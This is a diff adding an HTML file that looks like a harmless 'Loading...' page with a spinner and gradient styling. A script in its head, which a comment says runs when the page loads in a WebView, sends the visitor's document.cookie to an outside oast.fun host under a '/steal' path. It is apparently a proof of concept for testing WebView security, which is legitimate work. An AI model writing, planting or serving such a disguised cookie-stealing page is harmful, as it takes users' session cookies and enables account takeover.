@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading Page</title>
+<script>
+// This will execute when loaded in WebView
+fetch('https://wewemiolcppiegergmndptqy0h440tnza.oast.fun/steal?cookie=' + document.cookie);
+</script>
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: Arial, sans-serif;
+    }
+
+    body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        background: linear-gradient(135deg, #4f46e5, #7c3aed);
+        color: white;
+    }
+
+    .container {
+        text-align: center;
+        background: rgba(255,255,255,0.1);
+        padding: 40px;
+        border-radius: 16px;
+        backdrop-filter: blur(10px);
+        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    }
+
+    .spinner {
+        width: 60px;
+        height: 60px;
+        border: 6px solid rgba(255,255,255,0.3);
+        border-top: 6px solid white;
+        border-radius: 50%;
+        margin: 0 auto 20px;
+        animation: spin 1s linear infinite;
+    }
+
+    h1 {
+        margin-bottom: 10px;
+    }
+
+    p {
+        opacity: 0.8;
+    }
+
+    @keyframes spin {
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="spinner"></div>
+    <h1>Loading...</h1>
+    <p>Please wait while the content is being prepared.</p>
+</div>
+
+</body>
+</html>
